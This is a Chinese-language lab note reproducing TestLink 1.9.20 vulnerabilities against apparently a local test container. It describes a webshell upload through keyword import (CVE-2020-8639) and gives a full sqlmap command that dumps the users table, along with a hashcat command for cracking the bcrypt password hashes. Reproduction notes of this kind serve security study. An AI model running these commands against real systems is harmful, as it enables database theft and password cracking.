# TestLink漏洞复现笔记

### 文件包含漏洞（CVE-2020-8639）复现



- Teslink提供了使用关键字对测试案例进行分类的可能性。这些关键字可以导出和导入

![](img/keyword.png)

-  点击import

![](img/upload.png)

-  点击Upload file，这时候需要用用到burpsuite拦截请求

![](img/chosefile.png)

- 修改burpsuite的importType和uploadFile部分的内容，发送请求即上传传成功webshell

​	![](img/bp.png)

- 进入容器内可以看到上传成功的webshell

![](img/success.png)

- 然后再页面上访问上传的webshell

  容器内部有读写权限的logs的路径:`/opt/bitnami/testlink/logs`

![](img/web-success.png)

### sql注入漏洞

sqlmap 命令：

```sql
python sqlmap.py -u http://192.168.56.105:8001/lib/ajax/dragdroptreenodes.php --data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47" -p nodeid --cookie="PHPSESSID=rdkc7ut8reeqjn83k595knis66;TESTLINK1920TESTLINK_USER_AUTH_COOKIE=3e573d788ca673889d102839f070c97e2326ff083197d1820c1e983f4d69f1c5" --dump -D bitnami_testlink -T users

```

- --u 目标url

- --data 要通过post请求发送的数据字符串

- -p 可测试的参数

- --dump 转储的DBMS数据库表条目

- -D 数据库名称

- -T 表明

sqlmap扫描出的结果:

![](img/sqlmap-table.png)

能够获得所有的用户的名称、加密后的密码和cookie值，密码是用bcrypt方式加密的。

- 使用hashcat破解：` ./hashcat64.bin  --force -a 0 -m 3200 example500.hash example.dict`

  - -a 指定要破解的模式 ，‘-a 0‘字典攻击
  - -m 要破解的hash类型，3200是值的bcrypt加密类型，更多hash类型在[hashcat-Wiki]( https://hashcat.net/wiki/doku.php?id=hashcat )
  - --force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项
  - --show 现实已经破解的hash以及明文

  ![](img/hashcat.png)

#### hashcat使用

- sdk：软件开发工具包，SDK是一些被软件工程师用于为特定的软件包、软件框架、硬件平台、操作系统等创建应用软件的**开发工具的集合**。它可以简单的为某个程序设计语言提供应用程序接口API的一些文件，但也可能包括能与某种嵌入式系统通讯的复杂的硬件。SDK还经常包括示例代码、支持性的技术注解或者其他的为基本参考资料澄清疑点的支持文档
- OpenCL：（开放运算语言） 是第一个面向异构系统通用目的并行编程的开放式、免费标准，也是一个统一的编程环境，便于软件开发人员为高性能计算服务器、桌面计算系统、手持设备编写高效轻便的代码 

  

### 其他

[清理Docker的container，image与volume ]( https://note.qidong.name/2017/06/26/docker-clean/ )



## 参考

[Testlink 1.9.20: Unrestricted file upload and SQL injection]( https://ackcent.com/blog/testlink-1.9.20-unrestricted-file-upload-and-sql-injection/ )

[bcrypt加密方式]( https://www.jianshu.com/p/2b131bfc2f10 )

[hashcat-bcrypt-example]( https://gist.github.com/roycewilliams/4aa6a6d8d4822a02dcd23f0c907e6828 )

[hashcat使用教程]( https://xz.aliyun.com/t/4008#toc-17 )

[爆破/字典/掩码攻击]( https://www.anquanke.com/post/id/86211 )

[InfoSexy：如何在Ubuntu 18.04中使用Hashcat破解密码]( https://www.alexanderjsingleton.com/infosexy-how-to-use-hashcat-to-crack-passwords-in-ubuntu-18-04/ )

[下载OpenCL]( https://www.mql5.com/zh/articles/690 )

[Ubantu下安装hashcat]( https://www.freebuf.com/column/174074.html )

[解压并重命名]( https://www.cnblogs.com/bootoo/p/4678849.html )


